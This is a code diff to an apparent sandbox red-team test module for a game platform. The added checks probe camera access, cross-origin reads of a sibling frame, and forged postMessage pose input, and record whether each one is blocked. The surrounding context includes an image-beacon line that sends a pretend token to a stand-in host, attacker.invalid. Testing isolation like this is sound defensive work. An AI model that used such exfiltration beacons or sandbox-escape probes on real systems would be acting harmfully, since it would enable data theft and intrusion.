@@ -15,6 +15,9 @@ export default function init( ctx ) {
 		githubApi: 'pending',
 		forgedSave: 'pending',
 		imgBeacon: 'pending',
+		cameraAccess: 'pending',
+		siblingFrame: 'pending',
+		forgedPoseInput: 'pending',
 	};
 
 	// 1. Read the host's GitHub token — the only conceivable path is via
@@ -71,5 +74,49 @@ export default function init( ctx ) {
 	const beacon = new Image();
 	beacon.onload = () => { state.redteam.imgBeacon = 'leaked'; };
 	beacon.src = 'https://attacker.invalid/beacon.gif?exfil=' + encodeURIComponent( 'token=pretend-leaked-value' );
+
+	// 7. Pose-input-provider work order §4 — the game sandbox gets NO camera
+	// permission at all (only the posecaster sibling frame does, at its own
+	// origin); getUserMedia must fail here regardless of which model/camera
+	// a real device has.
+	if ( navigator.mediaDevices && navigator.mediaDevices.getUserMedia ) {
+
+		navigator.mediaDevices.getUserMedia( { video: true } )
+			.then( () => { state.redteam.cameraAccess = 'leaked'; } )
+			.catch( () => { state.redteam.cameraAccess = 'blocked'; } );
+
+	} else state.redteam.cameraAccess = 'blocked'; // no mediaDevices API reachable at all — same outcome
+
+	// 8. Reach the posecaster sibling frame or its contents — it's a SEPARATE
+	// frame embedded by the HOST, never a child of this sandbox, so there's no
+	// legitimate path to it. `window.parent.frames` itself is one of the
+	// handful of properties the HTML spec allows reading cross-origin (it's
+	// just an alias back to the same WindowProxy, same as `.length` — neither
+	// throws, and neither one actually exposes anything) — the REAL test is
+	// whether any of the host's own nested frames (the sibling posecaster
+	// frame among them) yield readable content through that reference; a
+	// cross-origin `.document` read on any of them must still throw.
+	try {
+
+		const n = window.parent.frames.length; // reading this never throws — not the actual check
+		let reachedAny = false;
+		for ( let i = 0; i < n; i ++ ) { void window.parent.frames[ i ].document; reachedAny = true; }
+		state.redteam.siblingFrame = reachedAny ? 'leaked' : 'blocked';
+
+	} catch { state.redteam.siblingFrame = 'blocked'; }
+
+	// 9/10. Forge a strata:input posted to THIS frame itself (not from the
+	// real host) — must never update ctx.input.pose(). The host->sandbox
+	// trust check is IDENTITY-based (event.source === window.parent), which
+	// rejects a self-post exactly the same way it would reject a post from
+	// any other non-host origin — there is no separate code path for "wrong
+	// origin" vs "not really the host" to bypass independently.
+	const beforePose = ctx.input.pose();
+	window.postMessage( { type: 'strata:input', provider: 'pose', channel: 'default', data: { t: Date.now(), pose: [ { name: 'FORGED', x: 0, y: 0, z: 0, score: 1 } ] } }, '*' );
+	setTimeout( () => {
+
+		state.redteam.forgedPoseInput = ctx.input.pose() === beforePose ? 'rejected' : 'leaked';
+
+	}, 50 );
 
 }
